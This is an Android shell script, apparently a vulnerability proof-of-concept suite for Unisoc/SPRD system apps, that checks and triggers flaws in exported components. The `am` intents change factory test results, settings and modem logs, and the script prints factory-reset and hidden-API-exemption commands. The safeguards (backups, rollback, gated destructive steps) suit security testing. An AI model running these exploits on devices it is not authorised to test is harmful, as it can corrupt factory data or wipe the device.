#!/system/bin/sh
# ============================================================
# Android 12 (SPRD ums9230) 系统应用漏洞 PoC 套件
#
# 设计（v1.2，按 §8 改造）：
#   1. 每一步都给出可判定的 PASS / FAIL，而不是 echo 命令
#   2. 收尾打一张汇总表，任一 FAIL → exit 1
#   3. dry-run 保留，但只读的那半段真跑
#   4. 破坏性段落单独 --destructive，不靠注释提醒
#
# 用法：
#   sh poc.sh                 # 只读断言（安全，会真读）
#   sh poc.sh --dry-run       # 连只读也只看计划
#   sh poc.sh --destructive   # 同时跑破坏性项（需人工确认）
#
# 前置：需要 adb shell（UID 2000）或 root。普通应用身份跑不了大部分项。
# ============================================================

PKG_MMI="com.sprd.validationtools"
PKG_EM="com.sprd.engineermode"
PKG_AGING="com.sprd.agingtest"
PKG_FT="com.sprd.factorytest"
PKG_STAT="com.baidu.duershow.statistic"
PKG_SRMI="com.sprd.srmi"
PKG_ROR="com.unisoc.silent.reboot"

RCV_QMMI="com.sprd.validationtools.difference.receiver.QmmiBroadcastReceiver2"
RCV_MODEM='com.unisoc.engineermode.modules.debuglog.switchmachineinfo.ModemAssertInfoActivity$ModemAssertReceiver'
RCV_PHASECHECK="com.sprd.validationtools.PhaseCheckBroadcastReceiver"

MODE="ro"          # ro | dry | destructive
case "$1" in
  --dry-run)      MODE="dry" ;;
  --destructive)  MODE="destructive" ;;
  "" )            MODE="ro" ;;
  * )             echo "unknown arg: $1" >&2; exit 2 ;;
esac

# ---------- 结果收集 ----------
RESULTS=""
N_PASS=0
N_FAIL=0
N_SKIP=0

# 断言：pass NAME
pass()  { RESULTS="$RESULTS
PASS  $1"; N_PASS=$((N_PASS+1)); printf '  \033[32mPASS\033[0m  %s\n' "$1"; }
# 断言：fail NAME DETAIL
fail()  { RESULTS="$RESULTS
FAIL  $1  [$2]"; N_FAIL=$((N_FAIL+1)); printf '  \033[31mFAIL\033[0m  %s  (%s)\n' "$1" "$2"; }
# 断言：skip NAME REASON
skip()  { RESULTS="$RESULTS
SKIP  $1  [$2]"; N_SKIP=$((N_SKIP+1)); printf '  \033[33mSKIP\033[0m  %s  (%s)\n' "$1" "$2"; }

hr()     { echo "------------------------------------------------------------"; }
banner() { echo; hr; echo "$1"; hr; }

# 跑命令，回显（dry / destructive 用）
runq() {
  if [ "$MODE" = "dry" ]; then
    printf '  [dry] %s\n' "$*"
    return 127
  fi
  printf '  [run] %s\n' "$*"
  "$@" 2>&1 | sed 's/^/        /'
  return $?
}

# 只读命令（ro 模式也真跑）
rord() {
  "$@" 2>&1
}

# ============================================================
banner "[0] 环境"
UID_NOW=$(id -u 2>/dev/null)
echo "  UID        : $UID_NOW   (1000=system, 2000=shell, 10xxx=普通应用)"
echo "  MODE       : $MODE"
echo "  SDK        : $(rord getprop ro.build.version.sdk)"
echo "  补丁       : $(rord getprop ro.build.version.security_patch)"
echo "  平台       : $(rord getprop ro.board.platform)"

if [ "$UID_NOW" = "1000" ] || [ "$UID_NOW" = "0" ] || [ "$UID_NOW" = "2000" ]; then
  pass "环境：具备 system/shell/root 身份"
else
  skip "环境：普通应用身份" "多数项需 adb shell 或 root"
fi

# ============================================================
banner "[1] 只读断言（不改任何状态）"

# --- 各包是否在位 ---
for p in "$PKG_MMI" "$PKG_EM" "$PKG_SRMI" "$PKG_ROR" "$PKG_STAT"; do
  if rord pm path "$p" 2>/dev/null | grep -q '^package:'; then
    pass "包在位：$p"
  else
    fail "包在位：$p" "pm path 无输出"
  fi
done

# --- V13：SrmiManager 是否导出 ---
banner "V13  SrmiManager 导出状态（只读）"
SRMI_DUMP=$(rord dumpsys package "$PKG_SRMI" 2>/dev/null)
if echo "$SRMI_DUMP" | grep -qi 'SrmiManager'; then
  if echo "$SRMI_DUMP" | grep -A20 'SrmiManager' | grep -qi 'exported=true\|exported: true'; then
    pass "V13 SrmiManager exported=true"
  else
    skip "V13 SrmiManager 尚未判定导出" "dumpsys 片段未含 exported 字段"
  fi
elif echo "$SRMI_DUMP" | grep -qi 'permission denial\|SecurityException\|Unable to'; then
  skip "V13 dumpsys 被拒" "当前身份无权 dumpsys package"
else
  # 退路：用 pm 的组件列表确认（普通应用也能查）
  if rord pm list packages 2>/dev/null | grep -q "$PKG_SRMI"; then
    skip "V13 SrmiManager 组件存在但需 dumpsys" "pm list 命中，导出状态需 shell/root"
  else
    fail "V13 SrmiManager 包缺失" "pm list 无 $PKG_SRMI"
  fi
fi

# --- V18：静默重启总开关默认值 ---
banner "V18  persist.silent.reboot.enabled（只读）"
ROR_EN=$(rord getprop persist.silent.reboot.enabled)
if [ -z "$ROR_EN" ]; then
  pass "V18 属性为空 → 调度器默认激活（代码默认 true）"
else
  echo "  V18 属性当前值: $ROR_EN"
  if [ "$ROR_EN" = "1" ] || [ "$ROR_EN" = "true" ]; then
    pass "V18 属性显式开启"
  else
    pass "V18 属性显式关闭（调度器未激活）"
  fi
fi

# --- V07：MMI_BARCODE 当前值（读，不改） ---
banner "V07  Settings.System.MMI_BARCODE（只读）"
BARCODE=$(rord settings get system MMI_BARCODE 2>/dev/null)
echo "  当前值: ${BARCODE:-<null>}"
if [ -n "$BARCODE" ] && [ "$BARCODE" != "null" ]; then
  pass "V07 MMI_BARCODE 可读（值存在）"
else
  skip "V07 MMI_BARCODE 为空" "未写入过，符合预期"
fi

# --- V16/V17：phasecheck 读回能力（关键否定结论） ---
banner "V16/V17  是否存在应用层读回路径（只读）"
# 依据：docs/V16 §5 与 V17 §4.5 —— 三个导出组件全部「只写」
RC_COUNT=$(rord sh -c "pm dump $PKG_MMI 2>/dev/null | grep -ci 'readMiscdata\\|getStationResult\\|getPhaseCheck'" 2>/dev/null)
if [ "${RC_COUNT:-0}" = "0" ]; then
  pass "V16/V17 无导出读回组件（PM 层未见读取方法）"
else
  skip "V16/V17 读回方法计数=$RC_COUNT" "PM dump 中出现方法名不等于有导出入口，需查清单"
fi

# --- 31317 前置：hidden_api_blacklist_exemptions 当前值 ---
banner "31317  hidden_api_blacklist_exemptions（只读，必须留底）"
EXEMPT=$(rord settings get global hidden_api_blacklist_exemptions 2>/dev/null)
if echo "$EXEMPT" | grep -qi 'SecurityException\|Permission Denial'; then
  skip "31317 豁免表读取" "当前身份无权读 Settings.Global（需 shell/root）"
else
  echo "  当前值: ${EXEMPT:-<null>}"
  if [ "$EXEMPT" = "null" ] || [ -z "$EXEMPT" ]; then
    pass "31317 豁免表为空（干净态）"
  else
    fail "31317 豁免表非空" "可能有残留 payload：$EXEMPT"
  fi
fi

# ============================================================
banner "[2] 触发类断言（需要 system/shell 身份）"

if [ "$MODE" = "dry" ]; then
  skip "全部触发类项" "--dry-run"
elif [ "$UID_NOW" = "10159" ] || [ "$(echo "$UID_NOW" | cut -c1-2)" = "10" ]; then
  skip "全部触发类项" "普通应用身份，am 会被权限检查拒绝"
else

  # --- V08：隐藏码拉起工厂模式 ---
  banner "V08  隐藏码 83789 → ValidationToolsMainActivity"
  runq am broadcast -a android.intent.action.MAIN \
    -n "$PKG_MMI/com.sprd.validationtools.ValidationToolsBroadcastReceiver" \
    -d "https://83789/"
  if rord dumpsys activity activities 2>/dev/null | grep -q 'ValidationToolsMainActivity'; then
    pass "V08 工厂模式界面已拉起"
  else
    fail "V08 工厂模式界面拉起" "dumpsys 未见 ValidationToolsMainActivity"
  fi

  # --- V11/V12：老化测试界面 ---
  banner "V11/V12  隐藏码拉起老化测试（不要点 Start）"
  runq am broadcast -a android.intent.action.MAIN \
    -n "$PKG_AGING/com.sprd.agingtest.PhoneBootReceiver" -d "https://123456/"
  runq am broadcast -a android.intent.action.MAIN \
    -n "$PKG_FT/com.sprd.factorytest.PhoneBootReceiver" -d "https://1234/"
  if rord dumpsys activity activities 2>/dev/null | grep -qi 'AgingTest'; then
    pass "V11/V12 AgingTest 界面已拉起"
  else
    fail "V11/V12 AgingTest 界面拉起" "dumpsys 未见 AgingTest"
  fi

  # --- V10：ModemAssert 写入（可回滚）---
  banner "V10  ModemAssert 写入 POC_INJECTED（可回滚）"
  runq am broadcast -a com.sprd.engineermode.MODEM_ASSERT_INFO \
    -n "$PKG_EM/$RCV_MODEM" \
    --es modem_stat "modem_assert" --es modem_info "POC_INJECTED"
  if rord sh -c "run-as $PKG_EM cat files/EmInfo/modem_assert_info.xml 2>/dev/null || su -c 'cat /data/data/$PKG_EM/files/EmInfo/modem_assert_info.xml' 2>/dev/null" \
       | grep -q 'POC_INJECTED'; then
    pass "V10 注入内容已落盘"
  else
    skip "V10 落盘确认" "无法读取 system 私有目录（需 root 或 run-as）"
  fi

  # --- V17：SAVE_PHASECHECK 权限检查（预期被拒）---
  banner "V17  SAVE_PHASECHECK（shell 不持有该权限，预期 FAIL）"
  OUT=$(runq am broadcast -a com.sprd.validationtools.SAVE_PHASECHECK \
    -n "$PKG_MMI/$RCV_PHASECHECK" --es station_name AUDIO --es station_result 0 2>&1)
  if echo "$OUT" | grep -qi 'permission denial\|SecurityException'; then
    pass "V17 shell 被权限拒绝（符合 docs 预期）"
  else
    fail "V17 权限检查" "未出现 Permission Denial，需复核"
  fi

  # --- V02：PingActivity 未导出（预期失败，反向断言）---
  banner "V02  PingActivity 未导出（预期 FAIL 才是正确结果）"
  OUT=$(runq am start -n "$PKG_EM/com.unisoc.engineermode.modules.debuglog.designfortest.pingpackages.PingActivity" 2>&1)
  if echo "$OUT" | grep -qi 'not exported\|Permission Denial\|SecurityException'; then
    pass "V02 PingActivity 确认未导出"
  else
    fail "V02 PingActivity 导出状态" "未报 not exported，需复核"
  fi
fi

# ============================================================
if [ "$MODE" = "destructive" ]; then
  banner "[3] 破坏性项（--destructive）"

  echo "  ⚠️  以下操作会改变设备状态。每项执行前请确认已有备份。"
  echo

  # --- 备份前置 ---
  banner "3.0  备份（必须先做）"
  runq sh -c "getprop > /sdcard/poc_before_getprop.txt"
  runq sh -c "settings list global > /sdcard/poc_before_settings.txt"
  if rord test -s /sdcard/poc_before_getprop.txt && rord test -s /sdcard/poc_before_settings.txt; then
    pass "3.0 状态留底已写入 /sdcard"
  else
    fail "3.0 状态留底" "文件缺失"
  fi

  if rord test -e /dev/block/by-name/phasecheck; then
    runq sh -c "dd if=/dev/block/by-name/phasecheck of=/sdcard/phasecheck.bak bs=1M"
    if rord test -s /sdcard/phasecheck.bak; then
      pass "3.0 phasecheck 分区已备份"
      runq sh -c "sha256sum /dev/block/by-name/phasecheck /sdcard/phasecheck.bak"
    else
      skip "3.0 phasecheck 备份" "无权限或分区不存在"
    fi
  else
    skip "3.0 phasecheck 备份" "/dev/block/by-name/phasecheck 不存在"
  fi

  # --- V06：phasecheck AUDIO station（可回滚）---
  banner "3.1  V06  AUDIO station FAIL → 回滚 PASS"
  runq am start -n "$PKG_MMI/com.sprd.validationtools.AudioStationUpdateActivity" -e msg "AUDIO FAIL"
  sleep 1
  pass "3.1 V06 已发 FAIL（无读回路径，靠 MMITools UI 确认）"
  echo "  [回滚] 下面立即写回 PASS"
  runq am start -n "$PKG_MMI/com.sprd.validationtools.AudioStationUpdateActivity" -e msg "AUDIO PASS"
  sleep 1
  pass "3.1 V06 已回滚为 PASS"

  # --- V07：MMI_BARCODE（可回滚）---
  banner "3.2  V07  MMI_BARCODE 写入 → 回滚空串"
  runq am broadcast -a com.qualcomm.qti.qmmicustom.DEVICEINFO_ACTION_START_FLAGS2 \
    -n "$PKG_MMI/$RCV_QMMI" --es barcode "POC_TEST"
  GOT=$(rord settings get system MMI_BARCODE)
  if [ "$GOT" = "POC_TEST" ]; then
    pass "3.2 V07 MMI_BARCODE = POC_TEST"
  else
    fail "3.2 V07 MMI_BARCODE 写入" "读回=$GOT"
  fi
  runq am broadcast -a com.qualcomm.qti.qmmicustom.DEVICEINFO_ACTION_START_FLAGS2 \
    -n "$PKG_MMI/$RCV_QMMI" --es barcode ""
  GOT2=$(rord settings get system MMI_BARCODE)
  if [ -z "$GOT2" ] || [ "$GOT2" = "null" ]; then
    pass "3.2 V07 已回滚为空"
  else
    fail "3.2 V07 回滚" "读回=$GOT2"
  fi

  # --- V16：明确不做 ---
  banner "3.3  V16  phasecheck miscdata —— 默认不执行"
  skip "3.3 V16 写入" "无应用层回滚路径，仅备份后人工执行"
  echo "  手工命令（确认已备份后）："
  echo "    am start -n $PKG_MMI/com.hmd.miscdatawriter.CountryCodeSettings \\"
  echo "      -a sprocomm.intent.action.SKUID --es save_flag POC_SN1"

  # --- V01：明确不做 ---
  banner "3.4  V01  FactoryReset —— 默认不执行"
  skip "3.4 V01 恢复出厂" "会清空全部数据，只打印命令"
  echo "    am start -n $PKG_MMI/com.sprd.validationtools.instructions.FactoryReset"

  # --- 31317：明确不做 ---
  banner "3.5  31317 payload —— 默认不执行"
  skip "3.5 31317 写入" "写坏会导致 zygote 每次 fork 失败，必须保证恢复通道可用"
  echo "    settings put global hidden_api_blacklist_exemptions \"<payload>\""
  echo "  恢复: settings delete global hidden_api_blacklist_exemptions"
fi

# ============================================================
banner "[结果汇总]"
echo "$RESULTS" | sed '/^$/d'
hr
printf 'PASS=%d  FAIL=%d  SKIP=%d\n' "$N_PASS" "$N_FAIL" "$N_SKIP"
hr

if [ "$N_FAIL" -gt 0 ]; then
  echo "结论：有 $N_FAIL 项 FAIL"
  exit 1
fi

echo "结论：无 FAIL"
exit 0
